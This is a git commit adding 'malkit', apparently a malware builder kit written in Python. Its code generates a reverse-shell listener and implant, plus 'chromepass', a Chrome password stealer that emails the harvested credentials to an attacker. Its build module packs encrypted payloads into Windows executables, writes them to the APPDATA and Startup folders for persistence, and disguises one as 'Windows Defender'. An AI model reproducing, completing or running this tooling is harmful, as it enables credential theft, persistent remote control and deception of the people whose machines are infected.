2252c0598cbaf8936b5efa6cbc0c02bf1b0da4aa
darkArp <marionascimento047@gmail.com>
2019-12-03 11:45:02 +0100

    update

---
+++ malkit.py
@@ -0,0 +1,229 @@
+import configparser
+import argparse
+import sys
+import os
+import time
+from darkarp.malkit_modules import build
+# from testing import build
+
+# LOAD SETTINGS #
+
+CONFIG_FILE = "malkit.conf"
+CONFIG = configparser.ConfigParser()
+CONFIG.read(CONFIG_FILE)
+
+
+def build_listener(args):
+    port = args.p
+    with open("templates/listener.mtemp", "r") as f:
+        listener_script = f.read()
+
+    listener_script_final = listener_script.replace(
+        "<<PORT>>", str(port))
+
+    with open("listener.py", "w") as f:
+        f.write(listener_script_final)
+    return len(listener_script_final)
+
+
+def build_malware(args):
+    print("[!] Still in testing")
+    host = f"'{args.host}'"
+    port = str(args.p)
+    for _ in range(5):
+        sys.argv.pop()
+    filename = CONFIG["MALWARE"]["Filename"]
+    target = CONFIG["MALWARE"]["Stub"]
+    output = CONFIG["MALWARE"]["Output"]
+
+    startup_name = CONFIG["MALWARE"]["Startup_name"]
+    startup_icon = CONFIG["MALWARE"]["Startup_icon"]
+    payload_name = CONFIG["MALWARE"]["Payload_name"]
+    timeout = CONFIG["MALWARE"]["Timeout"]
+
+    stub_try = CONFIG["STUB"]["TRY"]
+    stub_funclist = CONFIG["STUB"]["FUNC_LIST"]
+
+    temp_stub = CONFIG["TEMPLATES"]["stub"]
+    temp_listener = CONFIG["TEMPLATES"]["listener"]
+    temp_malware = CONFIG["TEMPLATES"]["malware"]
+
+    # Create Stub
+    with open(temp_stub, "r") as f:
+        stub_child = f.read()
+    stub_final = stub_child.replace("<<TRY>>", stub_try)
+    stub_final = stub_final.replace("<<FUNC_LIST>>", stub_funclist)
+    with open(target, "w") as f:
+        f.write(stub_final)
+
+    # Create Malware
+    with open(temp_malware, "r") as f:
+        mal_child = f.read()
+    mal_final = mal_child.replace("<<HOST>>", host)
+    mal_final = mal_final.replace("<<PORT>>", port)
+    mal_final = mal_final.replace("<<SESSION_TIMEOUT>>", timeout)
+    with open(filename, "w") as f:
+        f.write(mal_final)
+
+    # Build the Executable and clean
+    build.exebuild(target=target, include='darkarp.malkit_modules.encrypt',
+                   output=startup_name, icon=startup_icon)
+
+    include = build.generate_payload(filename=filename,
+                                     destname=payload_name, startup=startup_name, icon="icon.ico")
+
+    build.exebuild(target=target, include=include, output=output)
+    remove = [f'_malkit/{payload_name}.py',
+              'Windows Defender.exe', 'malware.py', 'stub.py']
+    for file in remove:
+        try:
+            os.remove(file)
+        except Exception as Err:
+            print(Err)
+
+    return print(len(stub_final))
+
+
+def build_chromepass(args):
+    if args.load:
+        print("Loading from file...")
+        print("Not implemented yet")
+    if args.email and not args.reverse_shell:
+        mailto = args.address
+        #pwd = args.password
+        for _ in range(4):
+            sys.argv.pop()
+
+        # Create Chromepass
+        temp_chromepass = CONFIG["TEMPLATES"]["chromepass_email"]
+        errorfile = CONFIG["TEMPLATES"]["error_OK"]
+
+        filename = CONFIG["CHROMEPASS"]["Filename"] + ".py"
+        passfile = CONFIG["CHROMEPASS"]["passfile"]
+        output = CONFIG["CHROMEPASS"]["output"]
+        server = CONFIG["CHROMEPASS"]["server"]
+        email = CONFIG["CHROMEPASS"]["email"]
+        pwd = CONFIG["CHROMEPASS"]["password"]
+        icon = CONFIG["CHROMEPASS"]["icon"]
+
+        if not args.no_error:
+            if args.errormsg:
+                error_msg = args.errormsg
+            else:
+                error_msg = CONFIG["CHROMEPASS"]["errormsg"]
+            with open(errorfile, "r") as f:
+                error_pre = f.read()
+            error_final = error_pre.replace("<<ERRORMSG>>", error_msg)
+            error_final = error_final.replace("<<TITLE>>", "Error")
+        else:
+            error_final = ""
+
+        with open(temp_chromepass, "r") as f:
+            cp_child = f.read()
+        cp_final = cp_child.replace("<<PASSFILE>>", passfile)
+        cp_final = cp_final.replace("<<EMAIL>>", email)
+        cp_final = cp_final.replace("<<PASSWORD>>", pwd)
+        cp_final = cp_final.replace("<<MAILTO>>", mailto)
+        cp_final = cp_final.replace("<<SERVER>>", server)
+        cp_final = cp_final.replace("<<ERROR>>", error_final)
+        with open(filename, "w") as f:
+            f.write(cp_final)
+        # Build the Executable and clean
+        build.exebuild(target=filename, include='',
+                       output=output, icon=icon)
+
+        try:
+            os.remove(filename)
+        except Exception as e:
+            print(e)
+
+        return print(len(cp_final))
+
+    elif args.reverse_shell and not args.email:
+        host = args.host
+        port = args.port
+        for _ in range(6):
+            sys.argv.pop()
+        print("Not implemented yet but it's easier than email... A copy paste will work, adding after rest is working")
+
+    else:
+        return print("Error, please specify one option (email or reverse shell)")
+
+
+def getOptions():
+    parser = argparse.ArgumentParser()
+    subparsers = parser.add_subparsers()
+
+    # Build listener
+    listener_example = '''example:
+
+ python malkit.py build_listener -p 4444'''
+
+    parser_build_listener = subparsers.add_parser(
+        'build_listener', epilog=listener_example, formatter_class=argparse.RawDescriptionHelpFormatter)
+    parser_build_listener.add_argument(
+        "-p", type=int, metavar=f"Port for reverse connection", required=True)
+    parser_build_listener.set_defaults(func=build_listener)
+
+    # Build malware
+    malware_example = '''example:
+
+ python malkit.py build_malware --host 127.0.0.1 -p 4444'''
+
+    parser_build_malware = subparsers.add_parser(
+        'build_malware', epilog=malware_example, formatter_class=argparse.RawDescriptionHelpFormatter)
+    parser_build_malware.add_argument(
+        "--host", type=str, metavar=f"IP for reverse connection", required=True)
+    parser_build_malware.add_argument(
+        "-p", type=int, metavar=f"Port for reverse connection.", required=True)
+    parser_build_malware.set_defaults(func=build_malware)
+
+    # Build chromepass
+    chromepass_example = '''example:
+
+ python malkit.py build_chromepass --email --address test@itsec.bz --password testpassword
+ python malkit.py build_chromepass --reverse_shell --host 127.0.0.1 -p 4444
+ python malkit.py build_chromepass --load myfile.conf'''
+
+    parser_build_chromepass = subparsers.add_parser(
+        'build_chromepass', epilog=chromepass_example, formatter_class=argparse.RawDescriptionHelpFormatter)
+    parser_build_chromepass.add_argument(
+        "--load", default=False, action="store_true", required=False)
+    parser_build_chromepass.add_argument(
+        "--email", default=False, action="store_true", required=False)
+    parser_build_chromepass.add_argument(
+        "--reverse_shell", default=False, action='store_true', required=False)
+    parser_build_chromepass.add_argument(
+        "--no_error", default=False, action='store_true', required=False)
+
+    parser_build_chromepass.add_argument(
+        "--errormsg", type=str, metavar=f"Error message to appear", required=False)
+    parser_build_chromepass.add_argument(
+        "--address", type=str, metavar=f"Email address to send details to, if Email was chosen", required=False)
+    parser_build_chromepass.add_argument(
+        "--port", type=int, metavar=f"Port for reverse connection, if Reverse shell was chosen.", required=False)
+    parser_build_chromepass.add_argument(
+        "--host", type=str, metavar=f"Host reverse connection, if Reverse shell was chosen.", required=False)
+
+    parser_build_chromepass.set_defaults(func=build_chromepass)
+
+    # Parse the arguments
+    args = parser.parse_args()
+
+    # Check for mutually inclusive
+
+    if args.email and (args.address is None):
+        parser.error("--email requires --address and --password.")
+    elif args.reverse_shell and (args.host is None or args.port is None):
+        parser.error("--reverse_shell requires --host and --port.")
+
+    try:
+        args.func(args)
+    except Exception as err:
+        # raise(err)
+        return parser.print_help()
+    return 0
+
+
+if __name__ == "__main__":
+    getOptions()
---
+++ testing/build.py
@@ -0,0 +1,117 @@
+import sys
+import os
+import pexe37
+from distutils.core import setup
+import darkarp.malkit_modules.encrypt as encrypt
+from shutil import rmtree
+from threading import Thread
+import time
+
+
+def exebuild(target, include, output, icon="icon.ico"):
+    try:
+        includes = []
+        if len(include) > 0:
+            includes = [f'{include}']
+        sys.argv.append("pexe37")
+        setup(
+            options={
+                "pexe37": {
+                    "bundle_files": 1,
+                    "optimize": 2,
+                    "excludes": [
+                        "doctest",
+                        "pdb",
+                        "unittest",
+                        "inspect",
+                        "difflib",
+
+
+                    ],
+
+                    "dll_excludes": ["msvcr71.dll", "Crypt32.dll", "tcl85.dll", "tk85.dll", "libcrypto-1_1-x64.dll"],
+                    "includes": includes
+                },
+
+            },
+            zipfile=None,
+            windows=[{
+                "script": target,
+                "icon_resources": [(1, icon)]
+            }]
+
+        )
+    except BaseException as e:
+        print("[+] polymorphism")
+    if os.path.exists(f"{output}.exe"):
+        os.remove(f"{output}.exe")
+    os.rename(f"dist\\{target[:-3]}.exe", f"{output}.exe")
+    rmtree("dist")
+    return 0
+
+
+def get_payload(filename: str):
+    encrypt_file(filename)
+    payload = []
+    for line in open(filename, "rb"):
+        payload.append(line)
+    payload = b''.join(payload)
+    decrypt_file(filename)
+    return payload
+
+
+def encrypt_file(filename: str):
+    return print(encrypt.encrypt(filename=filename))
+
+
+def decrypt_file(filename: str):
+    return print(encrypt.fully_decrypt(filename=filename))
+
+
+def gendie(filenames: list):
+    for name in filenames:
+        try:
+            os.remove(f"{name}.py")
+        except Exception as err:
+            os.remove(f"{name}.exe")
+    return 0
+
+
+def generate_payload(filename, destname, startup, icon="icons/icon.ico", modulename="_malkit"):
+    payload = get_payload(filename)
+    exepayload = exe_bytes(startup)
+    start_str = "startups='" + str(startup) + "'\n"
+    APPDATA = "APPDATA = getenv('APPDATA')\n"
+    STARTUP = "STARTUP = f'{APPDATA}\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\{startups}.exe'\n"
+    pyline = ""
+    pyline += f"from os import getenv\n"
+    pyline += start_str
+    pyline += APPDATA
+    pyline += STARTUP
+    pyline += f"filename = 'malware.py'\n"
+    pyline += "path2 = f'{APPDATA}\\\\{filename}'\n"
+    pyline += f"payload = {payload}\n"
+    pyline += f"exepayload = {exepayload}\n"
+    pyline += f"with open(path2, 'wb') as f:\n"
+    pyline += "    f.write(payload)\n"
+    pyline += f"with open(STARTUP, 'wb') as f:\n"
+    pyline += "    f.write(exepayload)"
+    print(len(pyline))
+    with open(f"_malkit/{destname}.py", "wb") as f:
+        f.write(pyline.encode())
+    return f"{modulename}"
+
+
+def exe_bytes(filename: str):
+    bytelist = []
+    for line in open(f"{filename}.exe", "rb"):
+        bytelist.append(line)
+    bytelist = b''.join(bytelist)
+    return bytelist
+
+
+if __name__ == "__main__":
+    # exebuild(target="stub.py", include='darkarp.malkit_modules.encrypt',
+    #          output='Windows Defender', icon="icons/icon2.ico")
+    exebuild(target="chromepass.py", include='',
+             output="chromepass", icon="icons/icon2.ico")
